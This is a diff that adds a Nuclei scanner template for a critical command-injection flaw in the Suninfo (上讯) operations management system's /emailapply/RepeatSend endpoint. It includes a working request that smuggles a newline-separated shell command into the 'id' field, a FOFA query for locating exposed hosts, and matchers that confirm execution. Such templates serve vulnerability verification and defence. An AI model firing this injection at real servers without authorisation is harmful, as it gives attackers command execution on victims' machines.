@@ -1,0 +1,48 @@
+id: suninfo-RepeatSend-rce
+info:
+  name: 上讯信息技术股份有限公司运维管理系统RepeatSend存在命令执行漏洞
+  author: leadlife
+  severity: critical
+  description: 上海上讯信息技术股份有限公司运维管理系统 /emailapply/RepeatSend存在命令执行漏洞，攻击者可直接获取服务器权限。
+  reference: 
+    - https://mp.weixin.qq.com/s/fHmak5p-eJ0n9ZjIk4mjoA
+    - https://github.com/MrWQ/vulnerability-wiki/blob/904905576ec32934bcdc63be3b528df30a65c430/docs/POC/%E4%B8%8A%E8%AE%AF%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E4%B8%8A%E8%AE%AF%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E8%BF%90%E7%BB%B4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FRepeatSend%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="default/getloginhtml"
+    tips:
+    repair:
+    version:
+  tags: rce,suninfo
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /emailapply/RepeatSend HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.850.86 Safari/537.36
+
+        id='%0aid>{{filename}}.txt%0a'
+
+      - |
+        GET /{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}} 
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+        
+      - type: regex
+        part: body_2
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
